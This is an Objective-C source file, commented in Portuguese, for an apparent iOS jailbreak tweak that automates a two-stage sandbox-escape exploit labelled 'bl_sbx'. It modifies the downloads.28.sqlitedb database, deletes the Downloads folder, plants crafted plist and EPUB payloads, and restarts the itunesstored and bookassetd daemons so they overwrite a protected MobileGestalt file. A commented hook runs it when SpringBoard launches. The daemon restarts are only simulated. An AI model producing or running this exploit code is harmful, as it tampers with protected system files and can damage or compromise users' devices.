#import "bl_sbx_tweak.h"
#import <sqlite3.h>
#import <dlfcn.h> // Para simular o controle de daemons (launchctl)

// --- Constantes de Caminho ---
#define DOWNLOADS_DB_PATH @"/var/mobile/Media/Downloads/downloads.28.sqlitedb"
#define ITUNES_METADATA_PATH @"/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist"
#define BOOKS_METADATA_PATH @"/var/mobile/Media/Books/iTunesMetadata.plist"
#define BOOKS_EPUB_PATH @"/var/mobile/Media/Books/iPhone13,2_26.0.1_MobileGestalt.epub"
#define BL_DB_MANAGER_SUFFIX @"/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"

// UUID de placeholder encontrado no arquivo original
#define PLACEHOLDER_UUID @"3DBBBC39-F5BA-4333-B40C-6996DE48F91C"

@implementation BLSbxAutomator

// --- 1. Descoberta de UUID ---
- (NSString *)findBLDatabaseManagerUUID {
    // Esta é uma implementação simplificada. Em um tweak real,
    // a busca seria mais robusta (ex: lendo logs ou iterando diretórios).
    
    // Vamos procurar por pastas em Shared/SystemGroup que contenham o BLDatabaseManager.sqlite
    NSString *systemGroupPath = @"/private/var/containers/Shared/SystemGroup/";
    NSFileManager *fm = [NSFileManager defaultManager];
    
    NSError *error = nil;
    NSArray *contents = [fm contentsOfDirectoryAtPath:systemGroupPath error:&error];
    
    if (error) {
        NSLog(@"[BLSbxAutomator] Erro ao ler SystemGroup: %@", error);
        return nil;
    }
    
    for (NSString *uuidDir in contents) {
        if ([uuidDir length] == 36 && [uuidDir rangeOfString:@"-"].location != NSNotFound) {
            NSString *fullPath = [systemGroupPath stringByAppendingPathComponent:[uuidDir stringByAppendingString:BL_DB_MANAGER_SUFFIX]];
            if ([fm fileExistsAtPath:fullPath]) {
                NSLog(@"[BLSbxAutomator] UUID encontrado: %@", uuidDir);
                return uuidDir;
            }
        }
    }
    
    NSLog(@"[BLSbxAutomator] Erro: UUID do BLDatabaseManager não encontrado.");
    return nil;
}

// --- 2. Modificação do SQLite ---
- (BOOL)modifyDownloadsDBWithUUID:(NSString *)uuid {
    sqlite3 *db;
    const char *dbpath = [DOWNLOADS_DB_PATH UTF8String];
    
    if (sqlite3_open(dbpath, &db) != SQLITE_OK) {
        NSLog(@"[BLSbxAutomator] Erro ao abrir o banco de dados: %s", sqlite3_errmsg(db));
        return NO;
    }
    
    NSString *oldString = [NSString stringWithFormat:@"/private/var/containers/Shared/SystemGroup/%@%@", PLACEHOLDER_UUID, BL_DB_MANAGER_SUFFIX];
    NSString *newString = [NSString stringWithFormat:@"/private/var/containers/Shared/SystemGroup/%@%@", uuid, BL_DB_MANAGER_SUFFIX];
    
    NSString *updateSQL = [NSString stringWithFormat:
                           @"UPDATE download SET long_description = REPLACE(long_description, '%@', '%@') WHERE long_description LIKE '%%%@%%'",
                           oldString, newString, PLACEHOLDER_UUID];
    
    char *errMsg;
    if (sqlite3_exec(db, [updateSQL UTF8String], NULL, NULL, &errMsg) != SQLITE_OK) {
        NSLog(@"[BLSbxAutomator] Erro ao atualizar o banco de dados: %s", errMsg);
        sqlite3_free(errMsg);
        sqlite3_close(db);
        return NO;
    }
    
    sqlite3_close(db);
    NSLog(@"[BLSbxAutomator] downloads.28.sqlitedb modificado com sucesso.");
    return YES;
}

// --- 3. Injeção de Arquivos e Controle de Daemons ---

// Função auxiliar para simular a cópia de arquivos (em um tweak real, os arquivos estariam no pacote)
- (BOOL)copyExploitFile:(NSString *)fileName toPath:(NSString *)destinationPath {
    // Em um tweak real, o caminho de origem seria o pacote do tweak
    NSString *sourcePath = [NSString stringWithFormat:@"/var/mobile/Media/bl_sbx_payloads/%@", fileName];
    NSFileManager *fm = [NSFileManager defaultManager];
    
    NSError *error = nil;
    if ([fm fileExistsAtPath:destinationPath]) {
        [fm removeItemAtPath:destinationPath error:nil]; // Limpa o arquivo antigo
    }
    
    if (![fm copyItemAtPath:sourcePath toPath:destinationPath error:&error]) {
        NSLog(@"[BLSbxAutomator] Erro ao copiar %@ para %@: %@", fileName, destinationPath, error);
        return NO;
    }
    
    NSLog(@"[BLSbxAutomator] Sucesso ao copiar %@ para %@", fileName, destinationPath);
    return YES;
}

// Função auxiliar para simular o reinício de daemons (launchctl)
- (BOOL)restartDaemon:(NSString *)daemonName {
    // Em um tweak real, usaríamos a API launchctl ou um comando shell
    // Como não podemos executar comandos shell diretamente aqui, apenas simulamos.
    NSLog(@"[BLSbxAutomator] SIMULANDO REINÍCIO DO DAEMON: %@", daemonName);
    
    // A lógica real envolveria:
    // system("launchctl stop com.apple.itunesstored");
    // system("launchctl start com.apple.itunesstored");
    
    // Para fins de código-fonte, assumimos sucesso.
    return YES;
}

- (BOOL)startExploit {
    NSLog(@"[BLSbxAutomator] Iniciando Exploração bl_sbx...");
    
    // 0. Encontrar UUID
    NSString *uuid = [self findBLDatabaseManagerUUID];
    if (!uuid) return NO;
    
    NSFileManager *fm = [NSFileManager defaultManager];
    
    // --- STAGE 1: itunesstored ---
    
    // 1. Modificar downloads.28.sqlitedb
    if (![self modifyDownloadsDBWithUUID:uuid]) return NO;
    
    // 2. Limpar /var/mobile/Media/Downloads
    NSError *error = nil;
    for (NSString *file in [fm contentsOfDirectoryAtPath:@"/var/mobile/Media/Downloads" error:&error]) {
        [fm removeItemAtPath:[@"/var/mobile/Media/Downloads" stringByAppendingPathComponent:file] error:nil];
    }
    
    // 3. Injetar downloads.28.sqlitedb modificado
    if (![self copyExploitFile:@"downloads.28.sqlitedb" toPath:DOWNLOADS_DB_PATH]) return NO;
    
    // 4. Reiniciar itunesstored (para que ele processe o novo DB)
    if (![self restartDaemon:@"com.apple.itunesstored"]) return NO;
    
    // 5. Verificar Stage 1 (iTunesMetadata.plist deve aparecer)
    // Em um tweak real, esperaríamos um pouco e verificaríamos.
    // Para o código-fonte, assumimos que o itunesstored escreveu o arquivo.
    
    // 6. Copiar iTunesMetadata.plist para /var/mobile/Media/Books/
    if (![self copyExploitFile:@"iTunesMetadata.plist" toPath:BOOKS_METADATA_PATH]) return NO;
    
    // --- STAGE 2: bookassetd ---
    
    // 7. Reiniciar bookassetd (para que ele processe o iTunesMetadata.plist)
    if (![self restartDaemon:@"com.apple.bookassetd"]) return NO;
    
    // 8. Injetar o payload EPUB
    if (![self copyExploitFile:@"iPhone13,2_26.0.1_MobileGestalt.epub" toPath:BOOKS_EPUB_PATH]) return NO;
    
    // 9. Reiniciar bookassetd novamente
    if (![self restartDaemon:@"com.apple.bookassetd"]) return NO;
    
    // 10. Copiar iTunesMetadata.plist novamente (para acionar a escrita final)
    if (![self copyExploitFile:@"iTunesMetadata.plist" toPath:BOOKS_METADATA_PATH]) return NO;
    
    // 11. Reiniciar bookassetd uma última vez (ou o dispositivo)
    if (![self restartDaemon:@"com.apple.bookassetd"]) return NO;
    
    NSLog(@"[BLSbxAutomator] Exploração concluída. Verifique o arquivo MobileGestalt.plist.");
    return YES;
}

@end

// --- Exemplo de Hook (para um tweak real) ---
/*
%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)application {
    %orig;
    
    // Exemplo de como chamar a automação
    BLSbxAutomator *automator = [[BLSbxAutomator alloc] init];
    [automator startExploit];
    [automator release];
}
%end
*/
